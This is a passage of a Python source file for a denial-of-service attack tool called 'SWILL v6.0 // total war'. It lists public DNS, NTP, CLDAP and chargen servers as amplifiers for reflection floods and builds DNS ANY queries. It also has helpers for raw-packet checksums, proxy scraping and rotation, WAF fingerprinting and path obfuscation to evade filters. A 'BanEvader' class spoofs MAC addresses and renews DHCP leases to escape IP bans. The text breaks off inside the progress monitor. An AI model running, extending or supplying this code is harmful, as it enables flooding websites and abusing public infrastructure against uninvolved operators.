#!/usr/bin/env python3

import os, sys, socket, struct, random, threading, time, logging, asyncio, ssl
import subprocess, json, platform, signal, multiprocessing, queue
from datetime import datetime
from urllib.parse import urlparse
from functools import partial

def ensure_libs():
    missing = []
    for lib in ["aiohttp", "httpx", "h2", "urllib3", "certifi"]:
        try: __import__(lib)
        except ImportError: missing.append(lib)
    if missing:
        print(f"Installing: {', '.join(missing)}")
        subprocess.run([sys.executable, "-m", "pip", "install"] + missing, capture_output=True)
        print("Done.\n")

ensure_libs()

import aiohttp
import httpx
try:
    import h2
    import h2.connection
    import h2.config
    import h2.events
    H2_OK = True
except Exception:
    H2_OK = False

try:
    import resource
    soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
    resource.setrlimit(resource.RLIMIT_NOFILE, (min(hard, 999999), hard))
except Exception:
    pass

LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)
LOG_FILE = os.path.join(LOG_DIR, f"swill_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)-7s | %(message)s",
    handlers=[logging.FileHandler(LOG_FILE, encoding="utf-8"), logging.StreamHandler(sys.stdout)])
log = logging.getLogger("Swill")

class C:
    R="\033[91m";G="\033[92m";Y="\033[93m";B="\033[94m";M="\033[95m";CY="\033[96m";W="\033[97m"
    BOLD="\033[1m";DIM="\033[2m";BLINK="\033[5m";RST="\033[0m"

BANNER = f"""{C.CY}
 ███████ ██   ██  ██████  ██   ██
 ██       ██ ██  ██    ██  ██ ██
 ███████   ███   ██    ██   ███
      ██  ██ ██  ██    ██  ██ ██
 ███████ ██   ██  ██████  ██   ██
{C.RST}{C.BOLD}                   S W I L L  v6.0{C.RST}{C.DIM}  //  total war{C.RST}
"""

ROOT = hasattr(os, "geteuid") and os.geteuid() == 0
CPU_COUNT = multiprocessing.cpu_count()

AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPad; CPU OS 17_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Edg/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)",
    "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)",
    "curl/8.4.0",
    "Wget/1.21.4",
    "python-requests/2.31.0",
    "Go-http-client/1.1",
    "Java/17.0.1",
    "Apache-HttpClient/4.5.14 (Java/1.8.0_381)",
    "Mozilla/5.0 (PlayBook; U; RIM Tablet OS 2.1.0; en-US) AppleWebKit/536.2+ (KHTML, like Gecko) Version/2.1.0.0 Safari/536.2+",
    "Mozilla/5.0 (MeeGo; N9) AppleWebKit/534.34 (KHTML, like Gecko) Version/5.0 Mobile Safari/534.34",
    "Opera/9.80 (X11; Linux x86_64; Edition Linux Mint) Presto/2.12.388 Version/12.16",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Valve Steam GameOverlay/1709251713) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

HTTP_METHODS = ["GET", "POST", "HEAD", "OPTIONS", "PUT", "DELETE", "PATCH", "PROPFIND", "MKCOL", "COPY", "MOVE", "LOCK"]

PATHS = [
    "/", "/index.html", "/index.php", "/index.htm", "/default.html", "/home", "/main",
    "/api", "/api/v1", "/api/v2", "/api/v3", "/api/v4", "/graphql", "/query",
    "/login", "/signin", "/signup", "/register", "/auth", "/oauth/token", "/oauth/authorize",
    "/admin", "/admin/", "/admin/login", "/admin panel", "/dashboard", "/panel",
    "/search", "/search?q=", "/find", "/lookup", "/query",
    "/about", "/about-us", "/contact", "/contact-us", "/privacy", "/terms", "/legal",
    "/robots.txt", "/sitemap.xml", "/sitemap-index.xml", "/feed", "/rss", "/atom.xml",
    "/wp-login.php", "/wp-admin/", "/wp-content/", "/wp-content/uploads/", "/wp-json/",
    "/wp-json/wp/v2/users", "/wp-json/wp/v2/posts", "/xmlrpc.php", "/wp-includes/",
    "/.well-known/security.txt", "/.well-known/openid-configuration",
    "/favicon.ico", "/favicon.png", "/apple-touch-icon.png", "/manifest.json",
    "/style.css", "/main.js", "/app.js", "/bundle.js", "/vendor.js", "/runtime.js",
    "/assets/", "/assets/img/logo.png", "/assets/css/main.css", "/assets/js/app.js",
    "/static/", "/static/js/main.js", "/static/css/style.css", "/static/img/bg.jpg",
    "/media/", "/media/uploads/", "/media/images/", "/cdn/", "/dist/", "/build/",
    "/js/", "/css/", "/img/", "/images/", "/fonts/", "/icons/",
    "/api/users", "/api/auth", "/api/auth/login", "/api/auth/register", "/api/auth/refresh",
    "/api/search", "/api/products", "/api/orders", "/api/cart", "/api/checkout",
    "/api/v1/users", "/api/v1/auth", "/api/v1/search", "/api/v1/products",
    "/api/v2/users", "/api/v2/auth", "/api/v2/search",
    "/health", "/healthz", "/healthcheck", "/status", "/metrics", "/debug", "/info",
    "/actuator", "/actuator/health", "/actuator/env", "/actuator/metrics",
    "/env", "/.env", "/.env.local", "/.env.production", "/config.json", "/config.yml",
    "/package.json", "/composer.json", "/.git/HEAD", "/.git/config", "/.gitignore",
    "/backup.sql", "/backup.zip", "/backup.tar.gz", "/dump.sql", "/db.sql",
    "/upload", "/uploads/", "/download", "/downloads/",
    "/server-status", "/server-info", "/phpinfo.php", "/info.php", "/test.php",
    "/cgi-bin/", "/cgi-bin/php", "/cgi-bin/bash",
    "/.svn/entries", "/.svn/wc.db", "/.DS_Store", "/Thumbs.db",
    "/web.config", "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/api/swagger.json", "/api-docs", "/swagger", "/swagger-ui", "/api/openapi.json",
    "/v1/", "/v2/", "/v3/", "/version", "/versions", "/changelog",
    "/webhook", "/webhooks/", "/callback", "/notify", "/event",
    "/socket.io/", "/ws", "/wss", "/websocket",
    "/stream", "/events", "/sse", "/longpoll",
    "/cart", "/checkout", "/payment", "/shipping", "/account", "/profile",
    "/blog", "/blog/feed", "/blog/rss", "/news", "/news/feed",
    "/forum", "/forum/index.php", "/comments", "/comment", "/review",
    "/download/file", "/download/attachment", "/file/", "/files/",
    "/share/", "/embed/", "/iframe/", "/preview/", "/view/",
    "/random", "/404", "/403", "/500", "/502", "/503",
]

LANGS = [
    "en-US,en;q=0.9", "ru-RU,ru;q=0.9", "de-DE,de;q=0.8", "fr-FR,fr;q=0.8",
    "ja-JP,ja;q=0.9", "zh-CN,zh;q=0.9", "ko-KR,ko;q=0.9", "es-ES,es;q=0.8",
    "it-IT,it;q=0.8", "pt-BR,pt;q=0.8", "nl-NL,nl;q=0.8", "pl-PL,pl;q=0.8",
    "tr-TR,tr;q=0.8", "ar-SA,ar;q=0.8", "hi-IN,hi;q=0.8", "th-TH,th;q=0.8",
    "vi-VN,vi;q=0.8", "id-ID,id;q=0.8", "ms-MY,ms;q=0.8", "fa-IR,fa;q=0.8",
    "uk-UA,uk;q=0.8", "cs-CZ,cs;q=0.8", "sk-SK,sk;q=0.8", "ro-RO,ro;q=0.8",
    "hu-HU,hu;q=0.8", "el-GR,el;q=0.8", "fi-FI,fi;q=0.8", "sv-SE,sv;q=0.8",
    "da-DK,da;q=0.8", "nb-NO,nb;q=0.8", "en-GB,en;q=0.9", "en-AU,en;q=0.9",
    "en-CA,en;q=0.9", "en-IN,en;q=0.9", "en-ZA,en;q=0.9", "en-NZ,en;q=0.9",
]

ENCODINGS = [
    "gzip, deflate, br", "gzip, deflate", "identity", "br, gzip", "deflate",
    "gzip, deflate, br, zstd", "zstd, gzip, deflate", "br", "gzip",
]

ACCEPT_TYPES = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,*/*;q=0.8",
    "application/json,text/javascript,*/*;q=0.01",
    "application/json, text/plain, */*",
    "*/*",
    "text/html,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
]

CACHE_CONTROL = [
    "no-cache", "no-cache, no-store, must-revalidate", "no-store",
    "max-age=0", "no-cache, no-store", "private, no-cache, no-store, must-revalidate",
]

PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAT.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAT.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/generated/http_proxies.txt",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=https&timeout=5000&country=all&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=5000&country=all",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=5000&country=all",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://www.proxy-list.download/api/v1/get?type=https",
    "https://www.proxy-list.download/api/v1/get?type=socks4",
    "https://www.proxy-list.download/api/v1/get?type=socks5",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
]

DNS_AMPLIFIERS = [
    "8.8.8.8","8.8.4.4","1.1.1.1","1.0.0.1","9.9.9.9","208.67.222.222","208.67.220.220",
    "4.2.2.1","4.2.2.2","4.2.2.3","4.2.2.4","4.2.2.5","4.2.2.6","4.2.2.7","4.2.2.8",
    "64.6.64.6","64.6.65.6","77.88.8.8","77.88.8.1","176.103.130.130","176.103.130.131",
    "119.29.29.29","223.5.5.5","223.6.6.6","180.76.76.76","114.114.114.114","114.114.115.115",
    "8.26.56.26","8.20.247.20","156.154.70.1","156.154.71.1","81.218.119.11","195.46.39.39",
    "195.46.39.40","23.21.43.50","37.235.1.174","37.235.1.177","91.239.100.100","89.233.43.71",
    "74.82.42.42","109.69.8.51","202.67.222.220","202.67.220.220","198.185.157.157",
    "199.85.126.20","199.85.127.20","84.200.69.80","84.200.70.40","76.76.19.19","76.76.2.0",
    "76.76.10.0","149.112.112.112","149.112.112.10","9.9.9.10","149.112.112.112",
]

NTP_AMPLIFIERS = [
    "time.google.com","time1.google.com","time2.google.com","time3.google.com","time4.google.com",
    "pool.ntp.org","0.pool.ntp.org","1.pool.ntp.org","2.pool.ntp.org","3.pool.ntp.org",
    "time.cloudflare.com","time.apple.com","time1.apple.com","time2.apple.com","time3.apple.com",
    "time4.apple.com","time5.apple.com","time.windows.com","time-a.nist.gov","time-b.nist.gov",
    "time-c.nist.gov","time-d.nist.gov","time.nist.gov","utcnist.colorado.edu","utcnist2.colorado.edu",
    "0.uk.pool.ntp.org","1.uk.pool.ntp.org","2.uk.pool.ntp.org","3.uk.pool.ntp.org",
    "0.de.pool.ntp.org","1.de.pool.ntp.org","2.de.pool.ntp.org","3.de.pool.ntp.org",
    "0.fr.pool.ntp.org","1.fr.pool.ntp.org","2.fr.pool.ntp.org","3.fr.pool.ntp.org",
    "0.jp.pool.ntp.org","1.jp.pool.ntp.org","2.jp.pool.ntp.org","3.jp.pool.ntp.org",
    "0.ru.pool.ntp.org","1.ru.pool.ntp.org","2.ru.pool.ntp.org","3.ru.pool.ntp.org",
    "0.us.pool.ntp.org","1.us.pool.ntp.org","2.us.pool.ntp.org","3.us.pool.ntp.org",
    "0.ca.pool.ntp.org","1.ca.pool.ntp.org","2.ca.pool.ntp.org","3.ca.pool.ntp.org",
    "0.au.pool.ntp.org","1.au.pool.ntp.org","2.au.pool.ntp.org","3.au.pool.ntp.org",
    "0.br.pool.ntp.org","1.br.pool.ntp.org","2.br.pool.ntp.org","3.br.pool.ntp.org",
    "0.in.pool.ntp.org","1.in.pool.ntp.org","2.in.pool.ntp.org","3.in.pool.ntp.org",
    "time1.isc.org","time2.isc.org","time3.isc.org","time4.isc.org",
    "clock.isc.org","timekeeper.isc.org","tick.isc.org","tock.isc.org",
]

DNS_AMP_DOMAINS = [
    ".","cloudflare.com","isc.org","ripe.net","apnic.net","amazon.com","github.com",
    "microsoft.com","google.com","yahoo.com","ebay.com","bing.com","wikipedia.org",
    "stackoverflow.com","reddit.com","netflix.com","spotify.com","instagram.com",
    "linkedin.com","twitter.com","akamai.com","fastly.com","cloudfront.net","azure.com",
    "apple.com","ibm.com","oracle.com","salesforce.com","adobe.com","intuit.com",
    "paypal.com","stripe.com","shopify.com","zoom.us","slack.com","atlassian.com",
    "githubusercontent.com","npmjs.com","docker.com","kubernetes.io","python.org",
    "openai.com","anthropic.com","deepmind.com","meta.com","alphabet.com",
]

CLDAP_SERVERS = [
    "85.214.132.117","168.126.63.1","202.124.249.50","203.248.252.2","134.0.218.117",
    "61.172.13.5","211.233.92.1","89.36.226.3","94.142.241.111","178.22.122.226",
    "212.83.158.35","5.135.183.217","45.83.91.170","45.83.91.171","193.176.144.15",
    "109.248.43.130","5.183.92.88","5.183.92.89","5.183.92.90","193.176.144.16",
    "92.223.86.56","92.223.86.57","194.99.105.99","194.99.105.100","194.99.105.101",
    "194.99.105.102","194.99.105.103","194.99.105.104","194.99.105.105","194.99.105.106",
]

CHARGEN_SERVERS = [
    "4.2.2.1","4.2.2.2","4.2.2.3","4.2.2.4","4.2.2.5","4.2.2.6","4.2.2.7","4.2.2.8",
    "10.0.0.1","192.168.1.1","172.16.0.1","172.17.0.1",
]

WAF_SIGNS = {
    "cloudflare": ["cloudflare", "cf-ray", "__cf_bm", "cf-cache-status", "server: cloudflare"],
    "aws_waf": ["awselb", "x-amzn", "x-amz-cf-id", "server: aws"],
    "akamai": ["akamai", "x-akamai", "akamai-grn", "server: akamaighost"],
    "sucuri": ["sucuri", "x-sucuri-id", "server: sucuri"],
    "imperva": ["incapsula", "x-iinfo", "visid_incap", "server: incapsula"],
    "fastly": ["fastly", "x-served-by", "x-cache", "x-fastly"],
    "squarespace": ["squarespace", "x-contextid", "x-via"],
    "ddos_guard": ["ddos-guard", "server: ddos-guard"],
    "f5": ["bigip", "x-cnection", "server: bigip"],
    "mod_security": ["mod_security", "modsecurity", "nginx-mod-security"],
}

def clear(): os.system("cls" if os.name == "nt" else "clear")
def rand_ip(): return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
def rand_port(): return random.randint(1024, 65535)
def resolve(t):
    try: return socket.gethostbyname(t)
    except: return None
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]; s.close(); return ip
    except: return "127.0.0.1"
def input_default(p, d):
    v = input(f"{C.DIM}{p}{C.RST}").strip(); return v if v else d
def checksum(data):
    if len(data) % 2: data += b"\x00"
    t = 0
    for i in range(0, len(data), 2): t += (data[i] << 8) + data[i + 1]
    t = (t >> 16) + (t & 0xFFFF); t += t >> 16; return ~t & 0xFFFF
def tcp_checksum(s, d, th):
    p = socket.inet_aton(s) + socket.inet_aton(d) + struct.pack("!BBH", 0, socket.IPPROTO_TCP, len(th))
    return checksum(p + th)
def build_dns_query(domain, qt=255):
    tid = random.randint(0, 65535)
    h = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0)
    q = b""
    for part in domain.split("."):
        if part: q += bytes([len(part)]) + part.encode()
    q += b"\x00"
    m = {"A": 1, "ANY": 255, "DNSKEY": 48, "TXT": 16, "AAAA": 28, "MX": 15, "NS": 2, "SOA": 6}
    q += struct.pack("!HH", m.get(qt, 255), 1)
    return h + q, len(h + q)
def gen_post_body():
    sz = random.choice([256, 512, 1024, 2048, 4096, 8192, 16384, 32768])
    k = random.choice(["data", "content", "value", "input", "payload", "message", "body", "text", "query", "name", "file", "upload"])
    v = os.urandom(sz).hex()
    extra = random.choice(["", f"&nonce={random.randint(10**10, 10**11)}", f"&ts={int(time.time())}", f"&id={random.randint(10**6, 10**9)}"])
    body = f"{k}={v}{extra}"
    return body, len(body)
def gen_huge_headers():
    r = ""
    for i in range(random.randint(5, 20)):
        key = f"X-Custom-{i}"
        val = os.urandom(random.choice([64, 128, 256, 512])).hex()
        r += f"{key}: {val}\r\n"
    return r
def gen_random_cookie():
    parts = []
    for _ in range(random.randint(1, 5)):
        k = random.choice(["sid", "token", "session", "uid", "csrf", "auth", "tracking", "cart", "pref", "theme"])
        v = os.urandom(random.choice([8, 16, 32])).hex()
        parts.append(f"{k}={v}")
    return "; ".join(parts)
def obfuscate_path(path):
    tricks = [
        lambda p: p,
        lambda p: p.replace("/", "//"),
        lambda p: p.replace("/", "/./"),
        lambda p: p.replace("/", "/%2e/"),
        lambda p: p.replace("/", "/../"),
        lambda p: p.upper() if random.random() > 0.5 else p,
        lambda p: p + ("?" * random.randint(0, 3)),
        lambda p: p + "%00" if random.random() > 0.7 else p,
        lambda p: "/." + p if p.startswith("/") else p,
        lambda p: p.replace("/", "/%2f/"),
    ]
    return random.choice(tricks)(path)
def get_mac(interface="wlan0"):
    try:
        with open(f"/sys/class/net/{interface}/address", "r") as f:
            return f.read().strip()
    except:
        return None
def get_interfaces():
    ifaces = []
    try:
        if os.path.exists("/sys/class/net/"):
            for f in os.listdir("/sys/class/net/"):
                if f != "lo" and not f.startswith("docker"):
                    ifaces.append(f)
    except:
        pass
    return ifaces or ["wlan0", "eth0"]

class ProxyPool:
    def __init__(self):
        self.proxies = {"http": [], "https": [], "socks4": [], "socks5": []}
        self.valid = {"http": [], "https": [], "socks4": [], "socks5": []}
        self.lock = threading.Lock()
        self.idx = {"http": 0, "https": 0, "socks4": 0, "socks5": 0}
        self.scraping = False
    def scrape(self):
        if self.scraping: return
        self.scraping = True
        def _scrape():
            import urllib.request
            for url in PROXY_SOURCES:
                try:
                    req = urllib.request.Request(url, headers={"User-Agent": random.choice(AGENTS)})
                    data = urllib.request.urlopen(req, timeout=10).read().decode(errors="ignore")
                    lines = [l.strip() for l in data.split("\n") if l.strip()]
                    if "socks5" in url:
                        self.proxies["socks5"].extend(lines)
                    elif "socks4" in url or "socks5_list" in url:
                        self.proxies["socks4"].extend(lines)
                    elif "https" in url or "HTTPS" in url or "ssl" in url:
                        self.proxies["https"].extend(lines)
                    else:
                        self.proxies["http"].extend(lines)
                except:
                    continue
            for k in self.proxies:
                seen = set()
                unique = []
                for p in self.proxies[k]:
                    if p not in seen:
                        seen.add(p)
                        unique.append(p)
                self.proxies[k] = unique
            total = sum(len(v) for v in self.proxies.values())
            print(f"  {C.G}Scraped {total} proxies{C.RST}")
            print(f"    HTTP: {len(self.proxies['http'])}  HTTPS: {len(self.proxies['https'])}  SOCKS4: {len(self.proxies['socks4'])}  SOCKS5: {len(self.proxies['socks5'])}")
            self.scraping = False
        threading.Thread(target=_scrape, daemon=True).start()
    def validate(self, test_url="http://httpbin.org/ip", timeout=5, max_workers=100):
        def _validate(ptype, proxy):
            try:
                if ptype == "http":
                    proxy_url = f"http://{proxy}"
                elif ptype == "https":
                    proxy_url = f"https://{proxy}"
                elif ptype == "socks4":
                    proxy_url = f"socks4://{proxy}"
                elif ptype == "socks5":
                    proxy_url = f"socks5://{proxy}"
                else:
                    return
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
                host, port = proxy.split(":")
                s.connect((host, int(port)))
                s.close()
                with self.lock:
                    if proxy not in self.valid[ptype]:
                        self.valid[ptype].append(proxy)
            except:
                pass
        def _run_validation():
            all_proxies = []
            for ptype in self.proxies:
                for p in self.proxies[ptype]:
                    all_proxies.append((ptype, p))
            random.shuffle(all_proxies)
            threads = []
            sem = threading.Semaphore(max_workers)
            def worker(ptype, proxy):
                with sem:
                    _validate(ptype, proxy)
            for ptype, proxy in all_proxies[:5000]:
                t = threading.Thread(target=worker, args=(ptype, proxy), daemon=True)
                t.start()
                threads.append(t)
            for t in threads:
                t.join(timeout=timeout + 1)
            total = sum(len(v) for v in self.valid.values())
            print(f"  {C.G}Validated: {total} working proxies{C.RST}")
            for k in self.valid:
                print(f"    {k.upper()}: {len(self.valid[k])}")
        threading.Thread(target=_run_validation, daemon=True).start()
    def get(self, ptype=None):
        if ptype is None:
            for k in self.valid:
                if self.valid[k]:
                    ptype = k
                    break
            if ptype is None:
                return None
        if not self.valid.get(ptype):
            return None
        with self.lock:
            if not self.valid[ptype]:
                return None
            p = self.valid[ptype][self.idx[ptype] % len(self.valid[ptype])]
            self.idx[ptype] += 1
            return p
    def get_url(self, ptype=None):
        p = self.get(ptype)
        if not p:
            return None, None
        if ":" in p and p.split(":")[0] in ("http", "https", "socks4", "socks5"):
            return p, p
        if ptype == "https":
            return p, f"https://{p}"
        elif ptype == "socks4":
            return p, f"socks4://{p}"
        elif ptype == "socks5":
            return p, f"socks5://{p}"
        else:
            return p, f"http://{p}"
    def count(self):
        return sum(len(v) for v in self.valid.values())
    def has(self):
        return self.count() > 0

proxy_pool = ProxyPool()

class BanEvader:
    @staticmethod
    def dhcp_renew():
        plat = platform.system().lower()
        if plat == "linux":
            ifaces = get_interfaces()
            for iface in ifaces:
                try:
                    subprocess.run(["sudo", "dhclient", "-r", iface], capture_output=True, timeout=10)
                    time.sleep(1)
                    subprocess.run(["sudo", "dhclient", iface], capture_output=True, timeout=10)
                except: pass
            subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], capture_output=True, timeout=10)
        elif plat == "windows":
            subprocess.run(["ipconfig", "/release"], capture_output=True, timeout=10)
            time.sleep(2)
            subprocess.run(["ipconfig", "/renew"], capture_output=True, timeout=10)
        elif plat == "darwin":
            subprocess.run(["sudo", "ipconfig", "set", "en0", "DHCP"], capture_output=True, timeout=10)
        time.sleep(2)
        return get_local_ip()
    @staticmethod
    def spoof_mac(interface="wlan0"):
        plat = platform.system().lower()
        new_mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))
        if plat == "linux":
            cmds = [
                ["sudo", "ip", "link", "set", "dev", interface, "down"],
                ["sudo", "ip", "link", "set", "dev", interface, "address", new_mac],
                ["sudo", "ip", "link", "set", "dev", interface, "up"],
            ]
            for cmd in cmds:
                try: subprocess.run(cmd, capture_output=True, timeout=5)
                except: pass
        elif plat == "darwin":
            try: subprocess.run(["sudo", "ifconfig", interface, "ether", new_mac], capture_output=True, timeout=5)
            except: pass
        return new_mac
    @staticmethod
    def full_bypass():
        old_ip = get_local_ip()
        ifaces = get_interfaces()
        for iface in ifaces:
            BanEvader.spoof_mac(iface)
            time.sleep(0.5)
        BanEvader.dhcp_renew()
        time.sleep(2)
        new_ip = get_local_ip()
        return old_ip, new_ip, new_ip != old_ip
    @staticmethod
    def check_ipv6():
        try:
            s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect(("ipv6.google.com", 80))
            s.close()
            return True
        except:
            return False

class WAFDetector:
    @staticmethod
    def detect(target, port):
        wafs = []
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target, port))
            req = (f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(AGENTS)}\r\n"
                   f"Accept: */*\r\nConnection: close\r\n\r\n")
            s.send(req.encode())
            resp = s.recv(8192).decode(errors="ignore")
            s.close()
            resp_lower = resp.lower()
            for waf_name, signs in WAF_SIGNS.items():
                for sign in signs:
                    if sign.lower() in resp_lower:
                        wafs.append(waf_name)
                        break
        except:
            pass
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            ss = ctx.wrap_socket(s, server_hostname=target)
            ss.connect((target, 443 if port == 80 else port))
            req = (f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(AGENTS)}\r\n"
                   f"Accept: */*\r\nConnection: close\r\n\r\n")
            ss.send(req.encode())
            resp = ss.recv(8192).decode(errors="ignore")
            ss.close()
            resp_lower = resp.lower()
            for waf_name, signs in WAF_SIGNS.items():
                for sign in signs:
                    if sign.lower() in resp_lower and waf_name not in wafs:
                        wafs.append(waf_name)
                        break
        except:
            pass
        return list(set(wafs))

class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.sent = 0; self.errors = 0; self.active = 0; self.bytes_sent = 0
        self.start_time = 0; self.peak_pps = 0; self.peak_bw = 0; self.amp_factor = 0
        self.peak_active = 0; self.total_conns = 0; self.status_codes = {}; self.proxy_errors = 0
    def reset(self):
        with self.lock:
            self.sent = 0; self.errors = 0; self.active = 0; self.bytes_sent = 0
            self.peak_pps = 0; self.peak_bw = 0; self.amp_factor = 0
            self.peak_active = 0; self.total_conns = 0; self.status_codes = {}; self.proxy_errors = 0
    def add_sent(self, n=1, b=0, amp=0):
        with self.lock:
            self.sent += n; self.bytes_sent += b
            if amp: self.amp_factor = amp
            e = max(0.1, time.time() - self.start_time)
            pps = int(self.sent / e); bw = self.bytes_sent / e
            if pps > self.peak_pps: self.peak_pps = pps
            if bw > self.peak_bw: self.peak_bw = bw
    def add_error(self, n=1):
        with self.lock: self.errors += n
    def add_proxy_error(self, n=1):
        with self.lock: self.proxy_errors += n
    def set_active(self, n):
        with self.lock:
            self.active = n
            if n > self.peak_active: self.peak_active = n
    def add_conn(self):
        with self.lock: self.total_conns += 1
    def add_status(self, code):
        with self.lock:
            self.status_codes[code] = self.status_codes.get(code, 0) + 1
    def pps(self):
        e = max(0.1, time.time() - self.start_time); return int(self.sent / e)
    def bw(self):
        e = max(0.1, time.time() - self.start_time)
        mb = (self.bytes_sent / e) / (1024 * 1024)
        return f"{mb:.1f} MB/s" if mb >= 1 else f"{mb * 1024:.0f} KB/s"
    def peak_bw_str(self):
        mb = self.peak_bw / (1024 * 1024)
        return f"{mb:.1f} MB/s" if mb >= 1 else f"{mb * 1024:.0f} KB/s"
    def top_codes(self, n=5):
        with self.lock:
            sorted_codes = sorted(self.status_codes.items(), key=lambda x: -x[1])[:n]
            return sorted_codes

stats = Stats()
last_result = ""
history = []

def monitor(name, duration, running):
    start = time.time(); stats.start_time = start
    while running[0] and (time.time() - start) < duration:
        e = int(time.time() - start)
        pct = min(100, int((e / max(1, duration)) * 100))
        bar = "█" * (pct // 5) + "░" * (20 - pct // 5)
        line = (f"\r{C.CY}[{name}]{C.RST} {bar} {pct:3d}% "
                f"| {C.G}Sent:{C.RST} {stats.sent:,} "
                f"| {C.R}Err:{C.RST} {stats.errors:,} "
                f"| {C.B}Active:{C.RST} {stats.active:,} "
                f"| {C.Y}PPS:{C.RST} {stats.pps():,} "
                f"| {C.M}BW:{C.RST} {stats.bw()}")
        if stats.amp_factor > 0: line += f" | {C.R}AMP:{C.RST} {stats.amp_factor}x"
